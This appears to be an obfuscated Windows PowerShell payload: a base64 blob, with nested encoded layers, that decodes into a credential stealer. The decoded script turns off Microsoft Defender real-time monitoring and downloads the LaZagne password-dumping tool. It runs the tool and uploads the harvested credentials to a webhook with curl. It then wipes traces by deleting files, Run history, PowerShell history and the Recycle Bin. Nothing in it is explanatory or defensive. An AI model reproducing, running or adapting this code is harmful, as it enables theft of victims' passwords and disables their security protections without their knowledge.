SQBrAFoAVwA1ADIATwBuAFIAbABiAFgAQgBjAFMAawBoAHIAYgBtAFoAMQBhAFUAUQBpAEQAUQBwAHAAWgBpAEEAbwBJAFMAaABVAFoAWABOADAATABWAEIAaABkAEcAZwBnAEwAVgBCAGgAZABHAGcAZwBJAGkAUgBrAGEAWABJAGkASwBTAGsAZwBlAHcAMABLAFQAbQBWADMATABVAGwAMABaAFcAMABnAEwAVQBsADAAWgBXADEAVQBlAFgAQgBsAEkARQBSAHAAYwBtAFYAagBkAEcAOQB5AGUAUwBBAHQAVQBHAEYAMABhAEMAQQBpAEoARwBSAHAAYwBpAEkATgBDAG4AMABOAEMAbQBsAG0ASQBDAGcAdABiAG0AOQAwAEkAQwBSADIAWgBYAEoAegBhAFcAOQB1AEsAUwBCADcARABRAG8AZwBJAEMAUgAyAFoAWABKAHoAYQBXADkAdQBJAEQAMABnAEkAagBJAHUATgBDADQAMQBJAGcAMABLAGYAUQAwAEsASgBHAHgAdgBaAHkAQQA5AEkAQwBJAGsAWgBHAGwAeQBYAEcAOQAxAGQASABCADEAZABDADUAMABlAEgAUQBpAEQAUQBvAGsAYgBtAFYANABkAEcAUgB2AGIAMwBJAGcAUABTAEEAaQBaADIAbAAwAGEASABWAGkATABtAE4AdgBiAFMASQBOAEMAaQBSADIAWgBYAEoAdABJAEQAMABnAEkAbgBZAGsAZABtAFYAeQBjADIAbAB2AGIAaQBJAE4AQwBpAFIAagBkAFgAQgBwAFoAQwBBADkASQBDAEoAVQBhAEcAVQBnAFQARQBGAGEAZQBTAEIAdABZAFcAcAB2AGMAaQBCADMAWQBYAE0AZwBaAG0AbAA0AGEAVwA1AG4ASQBFAE4AMQBjAEcAbABrADQAbwBDAFoAYwB5AEIAaQBjAG0AOQByAFoAVwA0AGcAYwBYAFYAcABkAG0AVgB5AEwAaQBJAE4AQwBpAFIAcwBZAFgAcAA1AEkARAAwAGcASQBsAEYAMQBhAFcATgByAEkARwBKAHkAYgAzAGQAdQBJAEcAWgB2AGUAQwBCAHEAZABXADEAdwBjAHkAQgB2AGQAbQBWAHkASQBIAFIAbwBaAFMAQgBzAFkAWABwADUASQBHAFIAdgBaAHkANABpAEQAUQBvAGsAWgBYAGcAZwBQAFMAQQBpAEwAbQBWADQAWgBTAEkATgBDAGkAUgBoAEkARAAwAGcASQBqAG8AaQBEAFEAbwBrAFkAaQBBADkASQBDAEkAdgBJAGcAMABLAEoARwBNAGcAUABTAEEAawBZADMAVgB3AGEAVwBRAHUAVQAzAFYAaQBjADMAUgB5AGEAVwA1AG4ASwBEAEUAcwBNAFMAawBOAEMAaQBSAGsASQBEADAAZwBKAEcAeABoAGUAbgBrAHUAVQAzAFYAaQBjADMAUgB5AGEAVwA1AG4ASwBEAEkAMwBMAEQARQBwAEQAUQBvAGsAWgBTAEEAOQBJAEMAUgBqAGQAWABCAHAAWgBDADUAVABkAFcASgB6AGQASABKAHAAYgBtAGMAbwBNAGoAZwBzAE0AUwBrAE4AQwBpAFIAbQBJAEQAMABnAEoARwBOADEAYwBHAGwAawBMAGwATgAxAFkAbgBOADAAYwBtAGwAdQBaAHkAZwB4AE4AeQB3AHgASwBRADAASwBKAEcAYwBnAFAAUwBBAGsAWQAzAFYAdwBhAFcAUQB1AFUAMwBWAGkAYwAzAFIAeQBhAFcANQBuAEsARABVAHMATQBTAGsATgBDAGkAUgBvAEkARAAwAGcASgBHAHgAaABlAG4AawB1AFUAMwBWAGkAYwAzAFIAeQBhAFcANQBuAEsARABNAHgATABEAEUAcABEAFEAbwBrAGEAUwBBADkASQBDAFIAagBkAFgAQgBwAFoAQwA1AFQAZABXAEoAegBkAEgASgBwAGIAbQBjAG8ATQBpAHcAeABLAFEAMABLAEoARwBvAGcAUABTAEEAawBiAEcARgA2AGUAUwA1AFQAZABXAEoAegBkAEgASgBwAGIAbQBjAG8ATQB6AEkAcwBNAFMAawBOAEMAaQBSAHIASQBEADAAZwBKAEcAeABoAGUAbgBrAHUAVQAzAFYAaQBjADMAUgB5AGEAVwA1AG4ASwBEAEUAdwBMAEQARQBwAEQAUQBvAGsAYgBDAEEAOQBJAEMAUgBqAGQAWABCAHAAWgBDADUAVABkAFcASgB6AGQASABKAHAAYgBtAGMAbwBNAHoAQQBzAE0AUwBrAE4AQwBpAFIAdABJAEQAMABnAEoARwB4AGgAZQBuAGsAdQBVADMAVgBpAGMAMwBSAHkAYQBXADUAbgBLAEQAYwBzAE0AUwBrAE4AQwBpAFIAdQBJAEQAMABnAEoARwB4AGgAZQBuAGsAdQBVADMAVgBpAGMAMwBSAHkAYQBXADUAbgBLAEQAZwBzAE0AUwBrAE4AQwBpAFIAdgBJAEQAMABnAEoARwBOADEAYwBHAGwAawBMAGwATgAxAFkAbgBOADAAYwBtAGwAdQBaAHkAZwAyAEwARABFAHAARABRAG8AawBjAEMAQQA5AEkAQwBSAGoAZABYAEIAcABaAEMANQBUAGQAVwBKAHoAZABIAEoAcABiAG0AYwBvAE4AQwB3AHgASwBRADAASwBKAEgARQBnAFAAUwBBAGsAWQAzAFYAdwBhAFcAUQB1AFUAMwBWAGkAYwAzAFIAeQBhAFcANQBuAEsARABJADAATABEAEUAcABEAFEAbwBrAGMAaQBBADkASQBDAFIAcwBZAFgAcAA1AEwAbABOADEAWQBuAE4AMABjAG0AbAB1AFoAeQBnADUATABEAEUAcABEAFEAbwBrAFoARwBWAHQAYgAyADQAZwBQAFMAQQBpAEoARwBNAGsAWgBDAFIAawBKAEcAVQBrAFoAaQBSAGgASgBHAEkAawBZAGkAUgB1AFoAWABoADAAWgBHADkAdgBjAGkAUgBpAEkAZwAwAEsASgBHAEYAdQBaADIAVgBzAEkARAAwAGcASQBpAFIAbgBKAEcAZwBrAGEAUwBSAG0ASgBHAFkAawBhAGkAUgByAEoARwB3AGsAYgBTAFIAdQBKAEcAOABrAFkAaQBSAHcASgBHAG8AawBiAHkAUgBxAEoASABFAGsAYQB5AFIAcABKAEcASQBrAGIAUwBSAHAASgBHAGcAawBhAFMAUgBxAEoARwBZAGsAYQBTAFIAbQBKAEcASQBrAGIAQwBSAHUASgBIAEkAawBhAHkAUgBvAEoARwA0AGsAYQBpAFIAcwBKAEcASQBpAEQAUQBvAGsAYQBIAFYAdABZAFcANABnAFAAUwBBAGkASgBIAFoAbABjAG0AMABrAFkAaQBSAHcASgBHAG8AawBiAHkAUgBxAEoASABFAGsAYQB5AFIAcABKAEcAVgA0AEkAZwAwAEsASgBIAHAAbABiAEcAUgBoAEkARAAwAGcASQBpAFIAawBaAFcAMQB2AGIAaQBSAGgAYgBtAGQAbABiAEMAUgBvAGQAVwAxAGgAYgBpAEkAZwBmAEMAQgBQAGQAWABRAHQAVQAzAFIAeQBhAFcANQBuAEQAUQBwAFgAYwBtAGwAMABaAFMAMQBJAGIAMwBOADAASQBDAFIANgBaAFcAeABrAFkAUQAwAEsAYQBXAFkAZwBLAEMAUgBCAFoARwAxAHAAYgBpAEEAdABaAFgARQBnAEoAMQBSAHkAZABXAFUAbgBLAFMAQgA3AEQAUQBvAGcASQBGAE4AbABkAEMAMQBOAGMARgBCAHkAWgBXAFoAbABjAG0AVgB1AFkAMgBVAGcATABVAFIAcABjADIARgBpAGIARwBWAFMAWgBXAEYAcwBkAEcAbAB0AFoAVQAxAHYAYgBtAGwAMABiADMASgBwAGIAbQBjAGcASgBIAFIAeQBkAFcAVQBOAEMAZwAwAEsASQBDAEIAQgBaAEcAUQB0AFQAWABCAFEAYwBtAFYAbQBaAFgASgBsAGIAbQBOAGwASQBDADEARgBlAEcATgBzAGQAWABOAHAAYgAyADUAUQBZAFgAUgBvAEkAQwBJAGsAWgBHAGwAeQBJAGcAMABLAGYAUQAwAEsASgBHAGgAcABaAEcAVQBnAFAAUwBCAEgAWgBYAFEAdABTAFgAUgBsAGIAUwBBAGkASgBHAFIAcABjAGkASQBnAEwAVQBaAHYAYwBtAE4AbABEAFEAbwBrAGEARwBsAGsAWgBTADUAaABkAEgAUgB5AGEAVwBKADEAZABHAFYAegBQAFMAZABJAGEAVwBSAGsAWgBXADQAbgBEAFEAcABKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABKAHAASQBDAEkAawBlAG0AVgBzAFoARwBFAGkASQBDADEAUABkAFgAUgBHAGEAVwB4AGwASQBDAEkAawBaAEcAbAB5AFgARwB4AGgAZQBtAEYAbgBiAG0AVQB1AFoAWABoAGwASQBnADAASwBKAGkAQQBpAEoARwBSAHAAYwBsAHgAcwBZAFgAcABoAFoAMgA1AGwATABtAFYANABaAFMASQBnAFkAVwB4AHMASQBEADQAZwBJAGkAUgBzAGIAMgBjAGkARABRAHAAagBkAFgASgBzAEwAbQBWADQAWgBTAEEAdABSAGkAQQBpAGMARwBGADUAYgBHADkAaABaAEYAOQBxAGMAMgA5AHUAUABYAHQAYwBZAEMASgAxAGMAMgBWAHkAYgBtAEYAdABaAFYAeABnAEkAagBvAGcAWABHAEEAaQBKAEcAVgB1AGQAagBwAEQAYgAyADEAdwBkAFgAUgBsAGMAawA1AGgAYgBXAFYAYwBZAEMASQBzAEkARgB4AGcASQBtAE4AdgBiAG4AUgBsAGIAbgBSAGMAWQBDAEkANgBJAEYAeABnAEkAawA1AGwAZAB5AEIARwBhAFcAeABsAEkARgBWAHcAYgBHADkAaABaAEcAVgBrAFkAQwBGAGMAYgBpAGgAQgBaAEcAMQBwAGIAagBvAGcASgBFAEYAawBiAFcAbAB1AEsAUwBCAGMAWQBDAEoAOQBJAGkAQQB0AFIAaQBBAGkAWgBtAGwAcwBaAFQAMQBBAFgARwBBAGkASgBHAHgAdgBaADEAeABnAEkAaQBJAGcASgBIAGQAbABZAG0AaAB2AGIAMgBzAGcAUABpAFIAdQBkAFcAeABzAEkARABJACsASgBqAEUATgBDAGwATgAwAFkAWABKADAATABWAE4AcwBaAFcAVgB3AEkAQwAxAFQAWgBXAE4AdgBiAG0AUgB6AEkARABJAHcARABRAHAAcABaAGkAQQBvAEoARQBGAGsAYgBXAGwAdQBJAEMAMQBsAGMAUwBBAG4AVgBIAEoAMQBaAFMAYwBwAGUAdwAwAEsASQBDAEIAVABaAFgAUQB0AFQAWABCAFEAYwBtAFYAbQBaAFgASgBsAGIAbQBOAGwASQBDADEARQBhAFgATgBoAFkAbQB4AGwAVQBtAFYAaABiAEgAUgBwAGIAVwBWAE4AYgAyADUAcABkAEcAOQB5AGEAVwA1AG4ASQBDAFIAbQBZAFcAeAB6AFoAUQAwAEsARABRAG8AZwBJAEYASgBsAGIAVwA5ADIAWgBTADEATgBjAEYAQgB5AFoAVwBaAGwAYwBtAFYAdQBZADIAVQBnAEwAVQBWADQAWQAyAHgAMQBjADIAbAB2AGIAbABCAGgAZABHAGcAZwBJAGkAUgBrAGEAWABJAGkARABRAHAAOQBEAFEAbwBrAGQAVwA1AG8AYQBXAFIAbABJAEQAMABnAFIAMgBWADAATABVAGwAMABaAFcAMABnAEkAaQBSAGsAYQBYAEkAaQBJAEMAMQBHAGIAMwBKAGoAWgBRADAASwBKAEgAVgB1AGEARwBsAGsAWgBTADUAaABkAEgAUgB5AGEAVwBKADEAZABHAFYAegBQAFMAZABPAGIAMwBKAHQAWQBXAHcAbgBEAFEAcABTAFoAVwAxAHYAZABtAFUAdABTAFgAUgBsAGIAUwBBAHQAVQBHAEYAMABhAEMAQQBpAEoARwBSAHAAYwBpAEkAZwBMAFYASgBsAFkAMwBWAHkAYwAyAFUAZwBMAFUAWgB2AGMAbQBOAGwAIAA+ACAAIgAkAFQAZQBtAHAARgBpAGwAZQAiADsAIABjAGUAcgB0AHUAdABpAGwAIAAtAGYAIAAtAGQAZQBjAG8AZABlACAAIgAkAFQAZQBtAHAARgBpAGwAZQAiACAAIgAkAEYAaQBsAGUAIgAgAHwAIABvAHUAdAAtAG4AdQBsAGwAOwAgACYAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAbAAuAHAAcwAxACIAOwAKAAoACgAKACAAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAiAHMAdABhAHQAcwAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiACAALQBGAG8AcgBjAGUAIAAtAFIAZQBjAHUAcgBzAGUAOwAKAAoAIAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACIAVwBJAEYASQAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiACAALQBGAG8AcgBjAGUAIAAtAFIAZQBjAHUAcgBzAGUAOwAKAAoAIAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACAAJABzAGMAcgBlAGUAbgBjAGEAcAB0AHUAcgBlACoAIAAtAEYAbwByAGMAZQAgAC0AUgBlAGMAdQByAHMAZQA7AAoACgAgACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAIAAkAGUAbgB2ADoAdABlAG0AcABcAHAALgBwAHMAMQAgAC0ARgBvAHIAYwBlACAALQBSAGUAYwB1AHIAcwBlADsACgAKACAAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAGUAbgB2ADoAdABlAG0AcABcAGQALgBwAHMAMQAgAC0ARgBvAHIAYwBlACAALQBSAGUAYwB1AHIAcwBlADsACgAKAAoAcgBtACAAJABlAG4AdgA6AFQARQBNAFAAXAAqACAALQByACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwAKAAoACgByAGUAZwAgAGQAZQBsAGUAdABlACAASABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwARQB4AHAAbABvAHIAZQByAFwAUgB1AG4ATQBSAFUAIAAvAHYAYQAgAC8AZgAgADsACgAKAAoAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwByAGUAYQBkAGwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsACgAKAAoAQwBsAGUAYQByAC0AUgBlAGMAeQBjAGwAZQBCAGkAbgAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsACgAKAAoAdABhAHMAawBrAGkAbABsACAALwBJAE0AIABEAGkAcwBjAG8AcgBkAC4AZQB4AGUAIAAvAEYAOwAKAAoACgAgACAAWwBNAGkAYwByAG8AcwBvAGYAdAAuAFAAbwB3AGUAcgBTAGgAZQBsAGwALgBQAFMAQwBvAG4AcwBvAGwAZQBSAGUAYQBkAEwAaQBuAGUAXQA6ADoAQwBsAGUAYQByAEgAaQBzAHQAbwByAHkAKAApADsACgAKACAAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIABIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABFAHgAcABsAG8AcgBlAHIAXABSAHUAbgBNAFIAVQA7AAoACgA=;

exit;
